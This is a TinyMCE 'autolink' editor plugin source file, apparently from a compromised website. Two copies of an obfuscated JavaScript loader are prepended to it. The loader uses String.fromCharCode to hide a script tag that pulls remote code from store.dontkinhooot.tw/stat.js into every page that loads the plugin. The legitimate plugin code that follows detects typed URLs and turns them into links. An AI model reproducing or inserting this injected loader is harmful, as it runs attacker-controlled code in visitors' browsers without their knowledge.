Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2011, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinymce.create('tinymce.plugins.AutolinkPlugin', {
	/**
	* Initializes the plugin, this will be executed after the plugin has been created.
	* This call is done before the editor instance has finished it's initialization so use the onInit event
	* of the editor instance to intercept that event.
	*
	* @param {tinymce.Editor} ed Editor instance that the plugin is initialized in.
	* @param {string} url Absolute URL to where the plugin is located.
	*/

	init : function(ed, url) {
		var t = this;

		// Add a key down handler
		ed.onKeyDown.addToTop(function(ed, e) {
			if (e.keyCode == 13)
				return t.handleEnter(ed);
		});

		// Internet Explorer has built-in automatic linking for most cases
		if (tinyMCE.isIE)
			return;

		ed.onKeyPress.add(function(ed, e) {
			if (e.which == 41)
				return t.handleEclipse(ed);
		});

		// Add a key up handler
		ed.onKeyUp.add(function(ed, e) {
			if (e.keyCode == 32)
				return t.handleSpacebar(ed);
			});
	       },

		handleEclipse : function(ed) {
			this.parseCurrentLine(ed, -1, '(', true);
		},

		handleSpacebar : function(ed) {
			 this.parseCurrentLine(ed, 0, '', true);
		 },

		handleEnter : function(ed) {
			this.parseCurrentLine(ed, -1, '', false);
		},

		parseCurrentLine : function(ed, end_offset, delimiter, goback) {
			var r, end, start, endContainer, bookmark, text, matches, prev, len;

			// We need at least five characters to form a URL,
			// hence, at minimum, five characters from the beginning of the line.
			r = ed.selection.getRng(true).cloneRange();
			if (r.startOffset < 5) {
				// During testing, the caret is placed inbetween two text nodes. 
				// The previous text node contains the URL.
				prev = r.endContainer.previousSibling;
				if (prev == null) {
					if (r.endContainer.firstChild == null || r.endContainer.firstChild.nextSibling == null)
						return;

					prev = r.endContainer.firstChild.nextSibling;
				}
				len = prev.length;
				r.setStart(prev, len);
				r.setEnd(prev, len);

				if (r.endOffset < 5)
					return;

				end = r.endOffset;
				endContainer = prev;
			} else {
				endContainer = r.endContainer;

				// Get a text node
				if (endContainer.nodeType != 3 && endContainer.firstChild) {
					while (endContainer.nodeType != 3 && endContainer.firstChild)
						endContainer = endContainer.firstChild;

					// Move range to text node
					if (endContainer.nodeType == 3) {
						r.setStart(endContainer, 0);
						r.setEnd(endContainer, endContainer.nodeValue.length);
					}
				}

				if (r.endOffset == 1)
					end = 2;
				else
					end = r.endOffset - 1 - end_offset;
			}

			start = end;

			do
			{
				// Move the selection one character backwards.
				r.setStart(endContainer, end >= 2 ? end - 2 : 0);
				r.setEnd(endContainer, end >= 1 ? end - 1 : 0);
				end -= 1;

				// Loop until one of the following is found: a blank space, &nbsp;, delimeter, (end-2) >= 0
			} while (r.toString() != ' ' && r.toString() != '' && r.toString().charCodeAt(0) != 160 && (end -2) >= 0 && r.toString() != delimiter);

			if (r.toString() == delimiter || r.toString().charCodeAt(0) == 160) {
				r.setStart(endContainer, end);
				r.setEnd(endContainer, start);
				end += 1;
			} else if (r.startOffset == 0) {
				r.setStart(endContainer, 0);
				r.setEnd(endContainer, start);
			}
			else {
				r.setStart(endContainer, end);
				r.setEnd(endContainer, start);
			}

			// Exclude last . from word like "www.site.com."
			var text = r.toString();
			if (text.charAt(text.length - 1) == '.') {
				r.setEnd(endContainer, start - 1);
			}

			text = r.toString();
			matches = text.match(/^(https?:\/\/|ssh:\/\/|ftp:\/\/|file:\/|www\.|(?:mailto:)?[A-Z0-9._%+-]+@)(.+)$/i);

			if (matches) {
				if (matches[1] == 'www.') {
					matches[1] = 'http://www.';
				} else if (/@$/.test(matches[1]) && !/^mailto:/.test(matches[1])) {
					matches[1] = 'mailto:' + matches[1];
				}

				bookmark = ed.selection.getBookmark();

				ed.selection.setRng(r);
				tinyMCE.execCommand('createlink',false, matches[1] + matches[2]);
				ed.selection.moveToBookmark(bookmark);
				ed.nodeChanged();

				// TODO: Determine if this is still needed.
				if (tinyMCE.isWebKit) {
					// move the caret to its original position
					ed.selection.collapse(false);
					var max = Math.min(endContainer.length, start + 1);
					r.setStart(endContainer, max);
					r.setEnd(endContainer, max);
					ed.selection.setRng(r);
				}
			}
		},

		/**
		* Returns information about the plugin as a name/value array.
		* The current keys are longname, author, authorurl, infourl and version.
		*
		* @return {Object} Name/value array containing information about the plugin.
		*/
		getInfo : function() {
			return {
				longname : 'Autolink',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/autolink',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('autolink', tinymce.plugins.AutolinkPlugin);
})();
